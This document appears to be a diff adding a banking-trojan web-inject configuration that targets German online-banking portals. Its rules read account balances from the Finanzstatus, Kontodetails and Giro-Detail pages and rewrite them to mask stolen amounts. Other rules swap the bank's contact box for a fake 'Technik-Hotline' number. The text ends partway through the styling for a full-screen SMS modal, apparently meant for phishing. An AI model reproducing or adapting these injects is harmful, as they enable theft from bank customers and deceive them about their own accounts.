+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|'>Finanzstatus</h2>|End
+ITINJSTART=|>%SELECTACC%[*]<td class="right">|End
+ITINJEND=|&nbsp;EUR|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|<span class="plus">%SPARBAL%+%AMOUNT%|End
+ITINJPASTEMN=|<span class="minus">%SPARBAL%+%AMOUNT%|End
+
+
+------------ haben, soll
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|'>Finanzstatus</h2>|End
+ITINITNAME=|%SPARGROUPHABEN%[0100]|End
+ITINITSTART=|<table class="btable table_finanzstatus">[*]<span class="plus">|End
+ITINITEND=|&nbsp;|End
+ITINITXPRREG=||End
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|'>Finanzstatus</h2>|End
+ITINITNAME=|%SPARGROUPSOLL%[0100]|End
+ITINITSTART=|<table class="btable table_finanzstatus">[*]<span class="minus">|End
+ITINITEND=|&nbsp;|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|'>Finanzstatus</h2>|End
+ITINJSTART=|<table class="btable table_finanzstatus">[*]Seitenanfang</a></td>[*]<tr class="tablefooter noborder">|End
+ITINJEND=|<tr class="tableheader noborder">|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|
+
+
+				<td class="right" colspan="2">Haben</td>
+
+				<td class="right"><span class="plus">%SPARGROUPHABEN%+%SPARGROUPSOLL%+%AMOUNT%&nbsp;EUR</span><br /></td>
+				<td></td>
+			</tr>
+
+
+
+	     |End
+ITINJPASTEMN=|
+
+
+				<td class="right" colspan="2">Soll<br /></td>
+
+				<td class="right"><span class="minus">%SPARGROUPHABEN%+%SPARGROUPSOLL%+%AMOUNT%&nbsp;EUR</span><br /></td>
+				<td></td>
+			</tr>
+
+
+
+	            |End
+
+--------------------------------------
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|'>Finanzstatus</h2>|End
+ITINITNAME=|%SPARGSALDO%[0100]|End
+ITINITSTART=|">&Uuml;bersicht</td>[*]</span><br /><span class="[*]</span><br /><span class="[*]">|End
+ITINITEND=|&nbsp;|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|'>Finanzstatus</h2>|End
+ITINJSTART=|<td class="right" colspan="2">|End
+ITINJEND=|</table>|End
+ITINJRXPREG=||End
+ITINJCODE=|">&Uuml;bersicht</td>|End
+ITINJPASTE=|
+
+			<td class="left">&Uuml;bersicht</td>
+
+
+			<td class="right">Gesamtsaldo<br /></td>
+			
+			<td class="right"><span class="plus">%SPARGSALDO%+%AMOUNT%&nbsp;EUR</span><br /></td>
+			<td>&nbsp;</td>
+		</tr>
+		</table>
+
+
+
+	     |End
+ITINJPASTEMN=|
+
+
+			<td class="left">&Uuml;bersicht</td>
+
+			<td class="right">Gesamtsaldo<br /></td>
+			
+			<td class="right"><span class="minus">%SPARGSALDO%+%AMOUNT%&nbsp;EUR</span><br /></td>
+			<td>&nbsp;</td>
+		</tr>
+		</table>
+
+
+
+	            |End
+
+
+
+
+
+
+========================= Kontodetails =========================
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|">Kontodetails</h2>|End
+ITINITNAME=|%SPARBAL%[0000]|End
+ITINITSTART=|<option value="%SELECTACC%" selected="selected">[*]Kontostand[*]texttable">|End
+ITINITEND=|&nbsp;|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|">Kontodetails</h2>|End
+ITINJSTART=|<option value="%SELECTACC%" selected="selected">[*]Kontostand[*]<span class="|End
+ITINJEND=|&nbsp;|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|habentexttable">%SPARBAL%+%AMOUNT%|End
+ITINJPASTEMN=|solltexttable">%SPARBAL%+%AMOUNT%|End
+
+
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|">Kontodetails</h2>|End
+ITINITNAME=|%SPARMAXBETR%[0000]|End
+ITINITSTART=|<option value="%SELECTACC%" selected="selected">[*]gbarer Betrag[*]texttable">|End
+ITINITEND=|&nbsp;|End
+ITINITXPRREG=||End
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|">Kontodetails</h2>|End
+ITINJSTART=|<option value="%SELECTACC%" selected="selected">[*]gbarer Betrag[*]<span class="|End
+ITINJEND=|&nbsp;|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|habentexttable">%SPARMAXBETR%+%AMOUNT%|End
+ITINJPASTEMN=|solltexttable">%SPARMAXBETR%+%AMOUNT%|End
+
+
+========================= Minifinanzstatus =========================
+
+
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=||End
+ITINITNAME=|%SPARBALFINS%[0100]|End
+ITINITSTART=|<p class="info_finanzstatus">[*]'>%SELECTACC%</a></td>[*]<td class="right">|End
+ITINITEND=|</td>|End
+ITINITXPRREG=||End
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<p class="info_finanzstatus">[*]'>%SELECTACC%</a></td>[*]<td class="right">|End
+ITINJEND=|</td>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|%SPARBALFINS%+%AMOUNT%|End
+ITINJPASTEMN=|<span class="solltexttable">%SPARBALFINS%+%AMOUNT%</span>|End
+
+
+
+
+
+
+
+*************************** Giro-Detail ***************************
+
+ITINITHOST=|portal.*|banking.*|bankingportal.*|End
+ITINITPAGE=|/portal/portal/*|End
+ITINITRXPREQ=||End
+ITINITIFREQ=||End
+ITINITPRM=|100|End
+ITINITIFCN=|<h2 class="contentbereichHeadLine">Giro-Detail-|End
+ITINITNAME=|%SPARBAL%[0200]|End
+ITINITSTART=|<td class="right tabledata">%SELECTACC%[*]<td class="right tabledata">[*]texttable">|End
+ITINITEND=|</span>|End
+ITINITXPRREG=||End
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|<h2 class="contentbereichHeadLine">Giro-Detail-|End
+ITINJSTART=|<td class="right tabledata">%SELECTACC%[*]<span class="|End
+ITINJEND=|&nbsp;|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|habentexttable">%SPARBAL%+%AMOUNT%|End
+ITINJPASTEMN=|solltexttable">%SPARBAL%+%AMOUNT%|End
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000[ps]000|End
+ITINJIFFOUND=|<h2 class="contentbereichHeadLine">Giro-Detail-|End
+ITINJSTART=|<td class="right tabledata">%SELECTACC%[*]<td class="right tabledata">[*]<td class="right tabledata">[*]<span class="|End
+ITINJEND=|</span>|End
+ITINJRXPREG=||End
+ITINJCODE=||End
+ITINJPASTE=|habentexttable">&minus;&nbsp;|End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+---------------------------------------------------------
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="if5_container|End
+ITINJEND=|<br style="clear:both;"/>|End
+ITINJRXPREG=||End
+ITINJCODE=|<p class="beratername"><b>|End
+ITINJPASTE=|
+
+
+
+		    			        <div class="if5_container if5_kontakt" id="if5_kontakt_container" style=""><div class="rounded"><div class="if5_white_o_rounded">&nbsp;</div><div class="if5_rand"><div class="if5_verlauf_o">&nbsp;</div><div class="rounded_content"><h5 class="kontakt"><span>Technik-Hotline </span></h5><h6><span id="telefon_nr">%TELFALSE%</span></h6><div class="analyst" id="if5_kontakt_container_analyst" style="display:none"><h5 class="head" id="if5_kontakt_container_analyst_head"><span>Sie werden beraten von:</span></h5><ul class="kontakt_list datablock" id="if5_kontakt_container_analyst_data">&nbsp;</ul></div><div class="standard" id="if5_kontakt_container_standard"><h5 class="head" id="if5_kontakt_container_standard_head" style="display:none"><span>Unser Service f&uuml;r Sie:</span></h5><ul class="kontakt_list datablock" id="if5_kontakt_container_standard_data">
+
+<li class="kontakt_email l4" id="if5_kontakt_container_standard_email"><a href="#" id="termin" title="E-Mail schreiben">E-Mail schreiben</a></li>
+
+
+
+</div><div class="if5_verlauf_u">&nbsp;</div></div><div class="if5_white_u_rounded">&nbsp;</div></div></div>
+
+
+</div>
+		    				</br>
+	</div>
+	  
+</div> 
+<br style="clear:both;"/>
+
+|End
+ITINJPASTEMN=||End
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="if5_container|End
+ITINJEND=|<br style="clear:both;"/>|End
+ITINJRXPREG=||End
+ITINJCODE=|<h5 class="kontakt">|End
+ITINJPASTE=|
+
+
+
+		    			        <div class="if5_container if5_kontakt" id="if5_kontakt_container" style=""><div class="rounded"><div class="if5_white_o_rounded">&nbsp;</div><div class="if5_rand"><div class="if5_verlauf_o">&nbsp;</div><div class="rounded_content"><h5 class="kontakt"><span>Technik-Hotline </span></h5><h6><span id="telefon_nr">%TELFALSE%</span></h6><div class="analyst" id="if5_kontakt_container_analyst" style="display:none"><h5 class="head" id="if5_kontakt_container_analyst_head"><span>Sie werden beraten von:</span></h5><ul class="kontakt_list datablock" id="if5_kontakt_container_analyst_data">&nbsp;</ul></div><div class="standard" id="if5_kontakt_container_standard"><h5 class="head" id="if5_kontakt_container_standard_head" style="display:none"><span>Unser Service f&uuml;r Sie:</span></h5><ul class="kontakt_list datablock" id="if5_kontakt_container_standard_data">
+
+<li class="kontakt_email l4" id="if5_kontakt_container_standard_email"><a href="#" id="termin" title="E-Mail schreiben">E-Mail schreiben</a></li>
+
+
+
+</div><div class="if5_verlauf_u">&nbsp;</div></div><div class="if5_white_u_rounded">&nbsp;</div></div></div>
+
+
+</div>
+		    				</br>
+	</div>
+	  
+</div> 
+<br style="clear:both;"/>
+
+|End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+ITINJHOST=|portal.*|banking.*|bankingportal.*|End
+ITINJPAGE=|/portal/portal/*|End
+ITINJRXPREQ=||End
+ITINJIFREQ=||End
+ITINJFRM=|11000*000|End
+ITINJIFFOUND=||End
+ITINJSTART=|<div class="if5_verlauf_o">&nbsp;</div>|End
+ITINJEND=|<form |End
+ITINJRXPREG=||End
+ITINJCODE=|&quot;Retouren-|End
+ITINJPASTE=|<div class="if5_verlauf_o">&nbsp;</div> <form |End
+ITINJPASTEMN=||End
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+=============================== SMS =================================
+
+ITVARNAME=|%SMSSCRIPT%|End
+ITVARPR=|00|End
+ITVARVALUE=|
+
+<style>
+
+
+		#modal-overlay{
+			background-color:#000000;
+			display:none;
+			height:100%;
+			left:0px;
+			position:fixed;
+			top:0px;
+			width:100%;
+			z-index:2147483646!important;
+			border:none!important;
+			padding:0!important;
+		}
+		
+		
+
+		#modal-window{
+		
+			
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		letter-spacing:normal!important;
+		text-transform:none!important;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px!important;
+		
+			border:none!important;
+			margin:0!important;
+			
+			
+			color:#000000;
+			background:#fff;
+			border-radius:7px;
+			-moz-box-shadow:0px 0px 10px 1px #000;
+			-webkit-box-shadow:0px 0px 10px 1px #000;
+			box-shadow:0px 0px 10px 1px #000;
+			display:none;
+			
+			min-height:450px;
+			letter-spacing:normal;
+			left:50%;
+			padding:10px 10px 15px 10px;
+			position:fixed;
+			top:50%;
+			width:600px;
+			z-index:2147483647;
+		}
+		
+		.head-wind-log {
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		min-width:500px;min-height:20px;margin-top:0;
+		text-transform:none!important;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px!important;
+		border:none!important;
+			padding:0!important;
+			background:none!important;}
+		
+		
+		
+		
+		#modal-window .logo{
+		color:#000;
+			box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+			
+			text-transform:none!important;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px!important;
+			border:none!important;
+			padding:0!important;
+			background:none!important;
+			width:95px;
+			height:67px;
+			
+			margin:10px!important;
+			float:left;
+		}
+		#modal-window .big,#modal-window h1{
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		
+		text-transform:none!important;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:24px!important;
+		border:none!important;
+		width:auto;height:auto;
+		float:none!important;
+			display:block;
+			background:none!important;
+			letter-spacing:normal;
+			margin:20px 0;
+			text-align:center;
+		}
+		
+		#modal-window p::selection ,#modal-window .text::selection ,#modal-window .text2::selection ,#modal-window form::selection ,.choose-lbl::selection {color:#000;background:#3869AB;}
+
+		#modal-window p,#modal-window .text{
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		text-transform:none!important;
+		letter-spacing:normal;
+			padding-left:0;
+			padding-right:0;
+			padding-bottom:0;
+			font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+			line-height:18px!important;
+			margin:0px 20px;
+			padding-top:1px;
+			text-align:left;
+			
+		}
+
+		
+		
+		#modal-window p,#modal-window .text2{
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		
+			font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:12px!important;
+		text-transform:none!important;
+		letter-spacing:normal;
+		padding:0!important;
+			
+			line-height:18px;
+			margin:0px;
+			text-align:left;
+		}
+			
+	
+		#modal-window form{
+		margin:0px 0px!important;
+		text-transform:none!important;
+		color:#000;
+		position:static !important;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		
+		display:block;
+		width:570px!important;
+		padding:0!important;
+		background:none!important;
+		border:none!important;
+		min-height:20px;
+		}
+
+
+		
+		
+
+		
+		
+		#modal-window .my-dl2
+		{
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+		
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		margin:10px 0px 0px;
+		border:none;
+		background:none;
+		text-transform:none!important;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		
+		
+		padding:0;
+		text-align:left
+		}
+		
+		#modal-window .my-dd2		
+		{color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		
+		margin:0;text-transform:none!important;
+		min-width:560px;
+		height:33px;
+		border:none;
+		background:none;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		
+		line-height:22px;
+		padding:0;
+		text-align:left
+		}	
+		
+		#modal-window .my-dl3
+		{color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		margin:10px 0px;
+		border:none;
+		background:none;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		
+		text-transform:none!important;
+		padding:0;
+		text-align:left
+		}
+		
+		#modal-window .my-dd3
+		
+		{
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		margin:0;text-transform:none!important;
+		border:none;
+		background:none;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		
+		min-width:560px;
+		height:33px;
+		line-height:22px;
+		padding:0;
+		text-align:left
+		}	
+		
+		
+		
+		
+		#modal-window .btn-left{
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+			bottom:20px;
+			left:20px;
+			border:none;
+		background:none;
+			position:absolute;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		
+		right:20px;
+		}
+		#modal-window .modal-back  {
+		color:#000;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		
+			text-transform:none!important;
+			margin:0;
+			padding:0;
+			border:none;
+		background:none;
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:normal!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		
+		bottom:0;
+			left:0;
+			right:0;
+			top:0;}
+			
+			
+		#modal-window .btn-right{
+		color:#000;
+		right:20px;
+		box-shadow: none !important; 	
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:absolute !important;
+			bottom:20px;
+			bottom:20px;
+			left:20px;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		border:none;
+		background:none;
+			text-transform:none!important;
+			padding:0!important;
+			min-width:540px;
+			min-height:46px;
+			
+			margin:20px 0 0 0;
+			
+			text-align:right;
+			}
+			
+
+		#modal-window input[type="text"]:focus,
+		#modal-window input[type="text"]:hover{
+			
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+			text-transform:none!important;
+			border-color:#5AACE5;
+			-webkit-box-shadow:inset 0 3px 6px 0 rgba(215, 215, 215, 0.7),0px 0px 5px 0px #5AACE5;
+			-moz-box-shadow:inset 0 3px 6px 0 rgba(215, 215, 215, 0.7),0px 0px 5px 0px #5AACE5;
+			box-shadow:inset 0 3px 6px 0 rgba(215, 215, 215, 0.7),0px 0px 5px 0px #5AACE5;
+		}
+			#modal-window input[type="radio"]:checked::after
+			
+			{
+				background:none;
+			}
+	
+		
+		#modal-window input[type="submit"] ,#modal-window input[type="button"]{
+		
+		
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		font-variant:normal!important;
+		font-style:normal!important;
+		font-stretch:normal!important;
+		font-weight:bold!important;
+		font-family:"Helvetica Neue",Helvetica,Arial,sans-serif !important;
+		font-size:14px;
+		color:#fff;
+		min-width:10px;
+		padding-left:15px!important;
+			padding-right:15px!important;
+			padding-top:0!important;
+			padding-bottom:0!important;
+		}
+		
+		
+		
+		#modal-window input[type="text"]{
+		
+		
+			box-sizing: content-box !important;
+			clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			text-align: auto !important;
+			text-decoration:none !important;
+			text-shadow: none !important;
+			transform: none !important;
+			vertical-align: inherit !important;
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+			word-spacing: normal !important;
+		
+		margin:0!important;
+		color:#000!important;
+		text-transform:none!important;
+		max-height:30px!important;
+		min-height:30px!important;
+		min-width:200px!important;
+			max-width:200px!important;
+			border:1px solid #8CA3AE;
+			-moz-border-radius:5px;
+			-webkit-border-radius:5px;
+			border-radius:5px;
+			background:#fff;
+			-moz-box-shadow:inset 0 3px 6px 0 rgba(215, 215, 215, 0.7);
+			-webkit-box-shadow:inset 0 3px 6px 0 rgba(215, 215, 215, 0.7);
+			box-shadow:inset 0 3px 6px 0 rgba(215, 215, 215, 0.7);
+			font-size:18px;
+			font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;
+			font-weight:normal;
+			
+			padding:0 5px !important;
+		
+		}
+		
+		
+		#modal-window .btn:hover,
+		#modal-window .btn:active{
+		
+		 	clear: none !important;
+			content:none !important;
+			counter-increment: none !important;
+			counter-reset: none !important;
+			float:none !important;
+			overflow: hidden !important;
+			position:relative !important;
+			resize: none !important;
+			table-layout: auto !important;
+			
+			transform: none !important;
+			
+			visibility: visible !important;
+			white-space: normal !important;
+			word-break: normal !important;
+		
+		color:#fff!important;
+			background:#00afe4;
+			background:-moz-linear-gradient(top, #33BFE9 0%, #3389D4 100%);
+			background:-webkit-linear-gradient(top, #33BFE9 0%,#3389D4 100%);
